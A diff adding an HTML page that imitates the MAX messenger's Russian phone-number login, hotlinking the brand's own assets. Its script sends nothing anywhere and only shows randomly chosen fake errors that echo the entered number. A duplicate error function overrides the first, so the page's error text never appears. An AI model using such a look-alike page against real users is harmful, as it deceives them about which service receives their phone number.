@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MAX</title>
+  <meta name="theme-color" content="#667eea">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="MAX">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="application-name" content="MAX">
+  <meta name="msapplication-TileColor" content="#667eea">
+  <meta name="msapplication-TileImage" content="icons/icon-144.png">
+  <link rel="manifest" href="manifest.json">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://max.ru/s/img/big-logo.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="https://max.ru/s/img/big-logo.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="https://max.ru/s/img/big-logo.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://max.ru/s/img/big-logo.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="https://max.ru/s/img/big-logo.png">
+  <link rel="apple-touch-icon" href="https://max.ru/s/img/big-logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://max.ru/s/img/big-logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://max.ru/s/img/big-logo.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="https://max.ru/s/img/big-logo.png">
+  <link rel="icon" type="image/png" sizes="512x512" href="https://max.ru/s/img/big-logo.png">
+  <link rel="shortcut icon" href="https://max.ru/s/img/big-logo.png">
+  <style>
+html, body {
+  height: 100%;
+  margin: 0;
+  padding: 0;
+}
+body {
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  color: #606061;
+  background:
+    radial-gradient(70% 80% at 50% 0%, rgba(14, 36, 80, 0.4), rgba(4, 6, 18, 0)),
+    linear-gradient(180deg, #03070E);
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  position: relative;
+  overflow-y: auto;
+}
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background-image: url("https://web.max.ru/_app/immutable/assets/pattern_space.aFb4MW9l.svg");
+  background-size: 300px 300px;
+  background-repeat: repeat;
+  opacity: 0.42;
+  filter: invert(1) grayscale(1) contrast(120%) brightness(40%) hue-rotate(-20deg);
+  pointer-events: none;
+  z-index: -2;
+}
+body::after {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background: rgba(120, 60, 255, 0.20);
+  mix-blend-mode: overlay;
+  pointer-events: none;
+  z-index: -1;
+}
+.auth-wrapper {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 100%;
+  padding: 0 20px;
+}
+.auth-card {
+  position: relative;
+  width: 100%;
+  max-width: 480px;
+  background: #17181c;
+  border-radius: 24px;
+  padding: 122px 52px 44px;
+  overflow: hidden;
+  will-change: transform;
+  transform: translateZ(0);
+}
+.auth-card::before {
+  content: "";
+  position: absolute;
+  top: -70%;
+  left: -15%;
+  width: 180%;
+  height: 180%;
+  background:
+    radial-gradient(880px 640px at 70% 5%, rgba(40, 140, 255, 0.6), rgba(40, 140, 255, 0) 70%),
+    radial-gradient(760px 540px at 45% -10%, rgba(160, 60, 255, 0.6), rgba(160, 60, 255, 0) 70%),
+    radial-gradient(900px 700px at 60% -25%, rgba(65, 190, 255, 0.45), rgba(65, 190, 255, 0) 75%);
+  filter: blur(100px);
+  opacity: 0.85;
+  pointer-events: none;
+}
+h1 {
+  font-size: 15px;
+  line-height: 1.35;
+  font-weight: 700;
+  text-align: center;
+  margin: 16px 0 6px;
+  color: #ffffff;
+}
+p.sub {
+  font-size: 15px;
+  line-height: 1.4;
+  text-align: center;
+  margin: 0 0 20px;
+  color: #77787a;
+}
+.logo-row {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 70px;
+}
+.logo-circle {
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  animation: spin 10s linear infinite, float 5s ease-in-out infinite;
+  opacity: 0.9;
+  position: relative;
+  overflow: hidden;
+}
+.logo-circle::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: url("https://web.max.ru/_app/immutable/assets/authLogo.CnGYimnD.png") center/60% no-repeat;
+}
+.logo-text {
+  font-size: 24px;
+  font-weight: 600;
+  color: #dfe4f1;
+  letter-spacing: 0.2px;
+  animation: float 5s ease-in-out -0.6s infinite;
+  margin-left: -10px;
+}
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-4px); }
+}
+@keyframes spin {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+.help {
+  position: absolute;
+  top: 19px;
+  right: 19px;
+  width: 26px;
+  height: 26px;
+  color: #9da7c1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  cursor: pointer;
+  text-align: center;
+  padding: 10px;
+}
+.help:hover {
+  border-radius: 30%;
+  background: rgba(255, 255, 255, 0.03);
+  padding: 10px;
+}
+.phone-group {
+  display: flex;
+  align-items: center;
+  width: 67%;
+  background: #363636;
+  border-radius: 17px;
+  padding: 0 12px;
+  height: 54px;
+  margin: 0 auto 8px auto;
+}
+.phone-group img.flag {
+  width: 22px;
+  height: 16px;
+  border-radius: 3px;
+  margin-right: 8px;
+}
+.phone-group .cc {
+  margin-right: 6px;
+  font-size: 14px;
+  color: #fff;
+}
+.phone-group input {
+  flex: 1;
+  border: none;
+  outline: none;
+  background: transparent;
+  color: #dce3f4;
+  font-size: 15px;
+  line-height: 1;
+}
+.phone-group input::placeholder {
+  color: #919191;
+}
+.hint {
+  font-size: 11px;
+  color: #545558;
+  margin-bottom: 40px;
+  padding-left: 90px;
+}
+.btn {
+  width: 65%;
+  height: 54px;
+  border-radius: 17px;
+  border: none;
+  font-weight: 600;
+  font-size: 15px;
+  cursor: pointer;
+  transition: background 0.2s, color 0.2s, opacity 0.2s;
+  background: #363636;
+  color: #757575;
+}
+.btn.login {
+  display: block;
+  width: 72%;
+  margin: 0 auto;
+  background: #363636;
+  color: #fff;
+}
+.btn.login.active {
+  background: #fff;
+  color: #000;
+  pointer-events: auto;
+  margin: 0 auto;
+}
+.btn.login.active:hover {
+  background: #ADADAD;
+}
+.register {
+  display: block;
+  margin-top: 88px;
+  text-align: center;
+  font-size: 16px;
+  font-weight: 500;
+  color: #2983ff;
+  text-decoration: none;
+}
+.register:hover {
+  text-decoration: none;
+}
+.faq-btn {
+  width: 100%;
+  height: 44px;
+  margin-top: 12px;
+  background: rgba(255, 255, 255, 0.05);
+  color: #a5afc6;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-radius: 12px;
+  font-size: 14px;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+.faq-btn:hover {
+  background: rgba(255, 255, 255, 0.1);
+}
+.legal {
+  margin-top: 30px;
+  font-size: 13px;
+  line-height: 1.35;
+  color: #77787a;
+  text-align: center;
+}
+.legal a {
+  color: #fff;
+  text-decoration: none;
+}
+.legal a:hover {
+  text-decoration: none;
+}
+@media (max-width: 480px) {
+  .auth-card {
+    padding: 40px 20px 32px;
+  }
+  h1 {
+    font-size: 18px;
+  }
+  p.sub {
+    font-size: 12px;
+  }
+}
+.card-animation {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 260px;
+  overflow: hidden;
+  opacity: 0.4;
+  pointer-events: none;
+  z-index: 0;
+}
+.card-animation::before {
+  content: "";
+  position: absolute;
+  inset: -50% 0 0 0;
+  width: 100%;
+  height: 200%;
+  border-radius: 50%;
+  background: #0a0f22;
+  filter: blur(100px);
+}
+.card-animation::after {
+  content: "";
+  position: absolute;
+  top: -175%;
+  left: 0;
+  width: 100%;
+  padding-bottom: 101%;
+  border-radius: 50%;
+  background: conic-gradient(from 90deg, #00aaff 0deg, #0066ff 120deg, #a600ff 180deg, #00aaff 240deg, #0066ff 300deg, #a600ff 360deg);
+  filter: blur(60px) saturate(250%) brightness(120%);
+  animation: rotateBackground 8s linear infinite;
+}
+@keyframes rotateBackground {
+  from { transform: rotate(0); }
+  to { transform: rotate(360deg); }
+}
+@font-face {
+  font-family: "MaxSans";
+  src: url("https://max.ru/s/fonts/max-sans/MaxSans-Regular.woff2") format("woff2");
+  font-weight: normal;
+  font-style: normal;
+}
+.max-font {
+  font-family: "MaxSans", sans-serif;
+}
+.backdrop {
+  position: fixed;
+  inset: 0;
+  background: rgba(10, 12, 20, 0.55);
+  -webkit-backdrop-filter: blur(6px);
+  backdrop-filter: blur(6px);
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.2s ease;
+  z-index: 20;
+}
+.backdrop.show {
+  opacity: 1;
+  visibility: visible;
+}
+.toast {
+  position: fixed;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%) scale(0.96);
+  width: min(460px, 92vw);
+  background: #0f1117;
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  border-radius: 18px;
+  box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+  color: #dfe3f1;
+  padding: 18px 18px 14px;
+  z-index: 21;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.18s ease, transform 0.18s ease;
+}
+.toast.show {
+  opacity: 1;
+  pointer-events: auto;
+  transform: translate(-50%, -50%) scale(1);
+}
+.toast__head {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 6px;
+}
+.toast__dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: radial-gradient(circle at 40% 35%, #ff4d4f 0, #ff3335 50%, #b30015 100%);
+  box-shadow: 0 0 16px rgba(255, 70, 80, 0.6);
+}
+.toast__title {
+  font-weight: 700;
+  font-size: 14px;
+  color: #fff;
+}
+.toast__desc {
+  font-size: 13px;
+  color: #9aa4bd;
+  margin-bottom: 10px;
+}
+.toast__code {
+  background: #0b0d12;
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  border-radius: 12px;
+  padding: 12px;
+  overflow: auto;
+  max-height: 38vh;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+  font-size: 12px;
+  line-height: 1.5;
+  color: #c9d4f5;
+}
+.toast__footer {
+  margin-top: 12px;
+  display: flex;
+  gap: 10px;
+  justify-content: flex-end;
+}
+.btn-small {
+  height: 36px;
+  padding: 0 14px;
+  border-radius: 10px;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  background: rgba(255, 255, 255, 0.06);
+  color: #cfd7ee;
+  font-weight: 600;
+  cursor: pointer;
+}
+.btn-small:hover {
+  background: rgba(255, 255, 255, 0.12);
+}
+.btn-small.primary {
+  background: #ffffff;
+  color: #000;
+  border-color: transparent;
+}
+.btn-small.primary:hover {
+  background: #dcdcdc;
+}
+@keyframes shake {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-6px); }
+  40% { transform: translateX(6px); }
+  60% { transform: translateX(-4px); }
+  80% { transform: translateX(4px); }
+  100% { transform: translateX(0); }
+}
+.shake {
+  animation: shake 0.34s ease both;
+}
+.input-error {
+  box-shadow: 0 0 0 2px rgba(255, 75, 85, 0.45) inset, 0 0 24px rgba(255, 75, 85, 0.25);
+  background: #2b1c22 !important;
+}
+@media (max-width: 600px) {
+  .toast {
+    left: 0;
+    right: 0;
+    bottom: 0;
+    top: auto;
+    transform: translateY(8px);
+    width: 100vw;
+    max-height: min(88dvh, 560px);
+    border-radius: 18px 18px 0 0;
+    padding: 16px 14px;
+    box-shadow: 0 -20px 60px rgba(0,0,0,.55);
+  }
+  .toast.show {
+    transform: translateY(0);
+  }
+  .toast__desc {
+    margin-bottom: 8px;
+  }
+  .toast__code {
+    max-height: clamp(160px, 40dvh, 380px);
+    border-radius: 12px;
+  }
+  .toast__footer {
+    position: sticky;
+    bottom: 0;
+    gap: 8px;
+    padding-top: 10px;
+    background: linear-gradient(180deg, rgba(15,17,23,0) 0%, rgba(15,17,23,1) 40%);
+  }
+  .btn-small {
+    height: 44px;
+    padding: 0 16px;
+    border-radius: 12px;
+    font-size: 15px;
+    margin-right: auto;
+    margin-left: auto;
+  }
+  @media (max-width: 380px) {
+    .toast__footer {
+      flex-direction: column-reverse;
+    }
+    .btn-small {
+      width: 100%;
+      margin-right: auto;
+      margin-left: auto;
+    }
+  }
+  .toast,
+  .backdrop {
+    padding-bottom: calc(env(safe-area-inset-bottom, 0px) + 8px);
+  }
+}
+@media (min-width: 601px) {
+  .toast {
+    width: min(520px, 92vw);
+  }
+}
+@media (prefers-reduced-motion: reduce) {
+  .toast,
+  .backdrop {
+    transition: none !important;
+  }
+}
+  </style>
+</head>
+<body>
+  <div class="auth-wrapper">
+    <section class="auth-card" id="authCard">
+      <div class="card-animation"></div>
+      <div class="help"><img src="free-icon-information-906794.png" width="17" height="17" style="filter: brightness(0) invert(1);"></div>
+      <div class="logo-row">
+        <div class="logo-circle"></div>
+        <div class="logo-text">
+          <svg xmlns="http://www.w3.org/2000/svg" width="68" height="21" fill="none">
+            <path fill="white" fill-opacity="0.6" d="M4.3 20h-4V1h6.5l4.4 13.1h.6l4.5-13h6.4v19h-4V6h-.6l-5 14H9.7L5 6h-.6v14ZM35.3 20.4c-1.8 0-3.4-.4-4.8-1.2a9 9 0 0 1-3.3-3.5 11 11 0 0 1-1.2-5.1c0-2 .4-3.6 1.2-5C28 4 29 2.7 30.5 2A9 9 0 0 1 35.3.7c1.6 0 3 .4 4.2 1 1.2.7 2.2 1.5 3 2.5l.9-3.1h3.1v19h-3.1l-.9-3c-.8.9-1.8 1.7-3 2.4-1.2.6-2.6 1-4.2 1Zm1-3.7c1.8 0 3.2-.6 4.3-1.7a6 6 0 0 0 1.7-4.4 6 6 0 0 0-1.7-4.4 5.7 5.7 0 0 0-4.3-1.7c-1.7 0-3.2.6-4.3 1.7a6 6 0 0 0-1.6 4.4c0 1.8.6 3.3 1.6 4.4a5.7 5.7 0 0 0 4.3 1.7ZM53.8 20H49l6-9.6L49.8 1h4.8L58 7.5h.7L62.5 1H67l-5.3 9 6 10h-5l-4-7.2h-.7L53.8 20Z"></path>
+          </svg>
+        </div>
+      </div>
+      <h1>С каким номером телефона хотите войти?</h1>
+      <p class="sub"><b>На него придёт СМС с кодом</b></p>
+      <div class="phone-group" id="phoneGroup">
+        <img src="data:image/svg+xml,%3Csvg width='24' height='18' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='24' height='6' fill='white'/%3E%3Crect y='6' width='24' height='6' fill='%230052FF'/%3E%3Crect y='12' width='24' height='6' fill='%23FF0000'/%3E%3C/svg%3E" class="flag" alt="RU">
+        <span class="cc">+7</span><img src="free-icon-down-arrow-2985150.png" width="15" height="15" style="filter: brightness(0) invert(5); padding-top: 0px; padding-right: 4px;">
+        <b><input id="phone" type="tel" inputmode="numeric" placeholder="000 000-00-00" maxlength="14" /></b>
+      </div>
+      <div class="hint"><b>Для входа нужен номер из России или Беларуси</b></div>
+      <button id="loginBtn" class="btn login">Войти</button>
+      <a href="#" id="registerLink" class="register">Зарегистрироваться</a>
+      <p class="legal">Нажимая «Войти», вы принимаете <a href="#">политику<br> конфиденциальности</a> и <a href="#">пользовательское соглашение</a></p>
+      <div class="backdrop" id="backdrop"></div>
+      <div class="toast" id="regError">
+        <div class="toast__head">
+          <div class="toast__dot"></div>
+          <div class="toast__title">Ошибка регистрации</div>
+        </div>
+        <div class="toast__desc" id="errorDesc">Не удалось войти или создать аккаунт. Попробуйте позже.</div>
+        <pre class="toast__code" id="errorCode" aria-live="polite">{ "error": { "code": "auth.registration_failed", "message": "Unexpected error" } }</pre>
+        <div class="toast__footer">
+          <button class="btn-small" id="closeErr">Закрыть</button>
+          <button class="btn-small primary" id="retryErr">Повторить</button>
+        </div>
+      </div>
+    </section>
+  </div>
+<script>
+  const input = document.getElementById('phone');
+  const btn = document.getElementById('loginBtn');
+  const phoneGroup = document.getElementById('phoneGroup');
+  function formatPhone(value) {
+    const digits = value.replace(/\D/g, '').substring(0, 10);
+    if (digits.length <= 3) return digits;
+    if (digits.length <= 6) return `${digits.slice(0,3)} ${digits.slice(3)}`;
+    if (digits.length <= 8) return `${digits.slice(0,3)} ${digits.slice(3,6)}-${digits.slice(6)}`;
+    return `${digits.slice(0,3)} ${digits.slice(3,6)}-${digits.slice(6,8)}-${digits.slice(8)}`;
+  }
+  input.addEventListener('input', (e) => {
+    const val = e.target.value;
+    e.target.value = formatPhone(val);
+    const digits = e.target.value.replace(/\D/g, '');
+    if (digits.length === 10) {
+      btn.classList.add('active');
+      btn.disabled = false;
+    } else {
+      btn.classList.remove('active');
+      btn.disabled = true;
+    }
+  });
+  const regLink = document.getElementById('registerLink');
+  const regError = document.getElementById('regError');
+  const backdrop = document.getElementById('backdrop');
+  const closeErr = document.getElementById('closeErr');
+  const retryErr = document.getElementById('retryErr');
+  const errorDesc = document.getElementById('errorDesc');
+  const errorCode = document.getElementById('errorCode');
+  const authCard = document.getElementById('authCard');
+  const toastTitle = regError.querySelector('.toast__title');
+  function randomHex(n=12){
+    const s = 'abcdef0123456789';
+    let out = '';
+    for (let i=0;i<n;i++) out += s[Math.floor(Math.random()*s.length)];
+    return out;
+  }
+  function showErr(payload){
+    authCard.classList.remove('shake'); void authCard.offsetWidth; authCard.classList.add('shake');
+    phoneGroup.classList.add('input-error');
+    setTimeout(()=>phoneGroup.classList.remove('input-error'), 1400);
+    toastTitle.textContent = payload.title || 'Ошибка';
+    errorDesc.textContent  = payload.desc || '';
+    errorCode.textContent  = JSON.stringify(payload.json, null, 2);
+    backdrop.classList.add('show');
+    regError.classList.add('show');
+  }
+  function hideErr(){
+    regError.classList.remove('show');
+    backdrop.classList.remove('show');
+  }
+  closeErr.addEventListener('click', hideErr);
+  backdrop.addEventListener('click', hideErr);
+  regLink.addEventListener('click', (e)=>{
+    e.preventDefault();
+    const reqId = 'req_' + Date.now().toString(36) + '_' + randomHex(6);
+    const phoneDigits = input.value.replace(/\D/g,'');
+    const code = (Math.random() < 0.5) ? 'auth.phone_blocked' : 'auth.rate_limited';
+    showErr({
+      title: 'Ошибка регистрации',
+      desc: (code === 'auth.phone_blocked')
+        ? 'Регистрация недоступна для указанного номера.'
+        : 'Слишком много попыток. Попробуйте позже.',
+      json: {
+        error: {
+          code,
+          message: (code === 'auth.phone_blocked')
+            ? 'Phone number is not allowed for registration'
+            : 'Too many attempts. Please wait and retry',
+          details: {
+            phone: phoneDigits ? `+7 ${formatPhone(phoneDigits)}` : null,
+            region: 'RU',
+            retry_after_sec: (code === 'auth.rate_limited') ? 120 : 0
+          }
+        },
+        request_id: reqId
+      }
+    });
+  });
+  btn.addEventListener('click', (e)=>{
+    if (!btn.classList.contains('active')) return;
+    const original = btn.textContent;
+    btn.textContent = 'Вход…';
+    btn.disabled = true;
+    const phoneDigits = input.value.replace(/\D/g,'');
+    const reqId = 'req_' + Date.now().toString(36) + '_' + randomHex(6);
+    const variants = [
+      {
+        code: 'auth.sms_not_delivered',
+        desc: 'Не удалось отправить СМС. Повторите попытку позже.',
+        json: {
+          error: {
+            code: 'auth.sms_not_delivered',
+            message: 'SMS provider returned non-success status',
+            details: { provider: 'twilio-like', retry_after_sec: 30 }
+          },
+          request_id: reqId
+        }
+      },
+      {
+        code: 'auth.code_incorrect',
+        desc: 'Неверный код подтверждения.',
+        json: {
+          error: {
+            code: 'auth.code_incorrect',
+            message: 'Provided OTP is invalid or expired',
+            details: { attempts_left: 2 }
+          },
+          request_id: reqId
+        }
+      },
+      {
+        code: 'auth.account_banned',
+        desc: 'Вход невозможен. Аккаунт временно заблокирован.',
+        json: {
+          error: {
+            code: 'auth.account_banned',
+            message: 'Account is suspended',
+            details: { until: new Date(Date.now()+3600e3).toISOString() }
+          },
+          request_id: reqId
+        }
+      },
+      {
+        code: 'service.unavailable',
+        desc: 'Сервис временно недоступен.',
+        json: {
+          error: {
+            code: 'service.unavailable',
+            message: 'Upstream timeout',
+            details: { timeout_ms: 3000 }
+          },
+          request_id: reqId
+        }
+      }
+    ];
+    setTimeout(()=>{
+      const pick = variants[Math.floor(Math.random()*variants.length)];
+      showErr({
+        title: 'Ошибка входа',
+        desc: pick.desc,
+        json: {
+          ...pick.json,
+          phone: phoneDigits ? `+7 ${formatPhone(phoneDigits)}` : null
+        }
+      });
+      btn.textContent = original;
+      btn.disabled = false;
+    }, 650);
+  });
+  retryErr.addEventListener('click', ()=>{
+    const reqId = 'req_' + Date.now().toString(36) + '_' + randomHex(6);
+    showErr({
+      title: toastTitle.textContent || 'Ошибка',
+      desc: 'Слишком много запросов. Попробуйте позже.',
+      json: {
+        error: { code: 'auth.rate_limited', message: 'Rate limit exceeded', details: { retry_after_sec: 60 } },
+        request_id: reqId
+      }
+    });
+  });
+  input.addEventListener('keydown', (e)=>{
+    if (e.key === 'Enter') btn.click();
+  });
+  let _scrollY = 0;
+  function lockBodyScroll() {
+    _scrollY = window.scrollY || document.documentElement.scrollTop;
+    document.body.style.position = 'fixed';
+    document.body.style.top = `-${_scrollY}px`;
+    document.body.style.left = '0';
+    document.body.style.right = '0';
+    document.body.style.width = '100%';
+    document.body.style.overflow = 'hidden';
+  }
+  function unlockBodyScroll() {
+    document.body.style.position = '';
+    document.body.style.top = '';
+    document.body.style.left = '';
+    document.body.style.right = '';
+    document.body.style.width = '';
+    document.body.style.overflow = '';
+    window.scrollTo(0, _scrollY);
+  }
+  function showErr(payload) {
+    backdrop.classList.add('show');
+    regError.classList.add('show');
+    lockBodyScroll();
+  }
+  function hideErr() {
+    regError.classList.remove('show');
+    backdrop.classList.remove('show');
+    unlockBodyScroll();
+  }
+</script>
+</body>
+</html>
